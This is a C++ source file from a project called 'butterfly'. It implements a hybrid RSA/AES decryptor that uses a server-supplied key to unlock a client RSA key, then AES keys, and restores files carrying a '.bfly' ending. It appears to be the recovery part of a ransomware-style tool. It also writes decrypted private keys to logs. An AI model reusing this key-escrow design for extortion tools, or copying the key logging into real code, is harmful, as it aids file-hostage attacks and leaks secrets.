
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
{
    LOG_TRACE("Create class Decryptor");
}

void Decryptor::removeBFLYEnding(std::string &filepath)
{
    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
    {
        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
    }
}

void Decryptor::removeDecryptedFiles()
{

    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESIV_FILENAME);
    butterfly::removeFile(butterfly::RSA_EKIV_FILENAME);

}

void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFromServer)
{
    // Decrypt the CPrivateRSA.bin file
    decryptCPrivateRSA(pkeyFromServer, butterfly::ENC_CPRIVATERSA_FILENAME);

    // Decrypt the AESKey.bin and AESIV.bin file
    std::string aesk, aesiv;
    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESIV_FILENAME, aesk, aesiv);

    auto files = DirectoryIterator::getAllFiles(dirPath);
    for (auto &file: files)
    {
        std::string filepath = file.string();
        removeBFLYEnding(filepath);
        decryptFileWithAES(filepath, aesk, aesiv);
    }

    removeDecryptedFiles();
}

void Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->readEncMSGFromFile(encCPrivateRSAFile);
    EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    try
    {
        _rsaDecryptorCPrivateRSA->decryptEVP(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
        //_rsaDecryptorCPrivateRSA->decrypt(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA);
        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);
        //std::cout << "Decrypted CPrivateRSA: " << _decryptedCPrivateRSA << std::endl;

    } catch (RSADecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    // Check if string is empty
    if ( _decryptedCPrivateRSA.empty() )
    {
        throw DecryptorException("Decrypted CPrivateRSA String is empty!");
    }

    // Check if decryption was successful
    if (_decryptedCPrivateRSA.find("-----BEGIN RSA PRIVATE KEY-----") == std::string::npos)
    {
        throw DecryptorException("Decrypted CPrivateRSA String does not include '-----BEGIN RSA PRIVATE KEY-----'");
    }

}

void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, const std::string &filepathAESIV, std::string &decAESKey,  std::string &decAESIV)
{

    std::unique_ptr<rsa::RSADecryptor> rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));
    std::unique_ptr<rsa::RSADecryptor> rsaDecryptorAESIV  = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));

    std::string encAESKey = rsaDecryptorAESKey->readEncMSGFromFile(filepathAESKey);  // Length of encAESKey = 256
    std::string encAESIV  = rsaDecryptorAESIV->readEncMSGFromFile(filepathAESIV);    // Length of encAESIV  = 256

    try
    {
        rsaDecryptorAESKey->decryptEVP(rsaDecryptorAESKey->getEvpPkey(), encAESKey, decAESKey, butterfly::RSAKEY_TYPE::AESKEY);
        //rsaDecryptorAESKey->decrypt(rsaDecryptorAESKey->getEvpPkey(), encAESKey, decAESKey);
        LOG_TRACE("Decrypted Content from file " << filepathAESKey << ": " << decAESKey << " with Length: " << decAESKey.length());
        //std::cout << "Decrypted Content from file " << filepathAESKey << ": " << decAESKey << std::endl;

        rsaDecryptorAESIV->decryptEVP(rsaDecryptorAESIV->getEvpPkey(), encAESIV, decAESIV, butterfly::RSAKEY_TYPE::AESIV);
        //rsaDecryptorAESIV->decrypt(rsaDecryptorAESIV->getEvpPkey(), encAESIV, decAESIV);
        LOG_TRACE("Decrypted Content from file " << filepathAESIV << ": " << decAESIV << " with Length: " << decAESIV.length());
        //std::cout << "Decrypted Content from file " << filepathAESIV << ": " << decAESIV << std::endl;

    } catch (RSADecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    // Check if string is empty
    if ( decAESKey.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESKey + " is empty!");
    }

    // Check if string is empty
    if ( decAESIV.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESIV + " is empty!");
    }

}

void Decryptor::decryptFileWithAES(const std::string &filepath, std::string &aeskey, std::string &aesiv)
{
    // Set AESKey and AESIV
    _aesDecryptor->setAESKey(aeskey);
    _aesDecryptor->setAESIv(aesiv);

    try
    {
        // Decrypt the file with AES
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
        throw DecryptorException(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
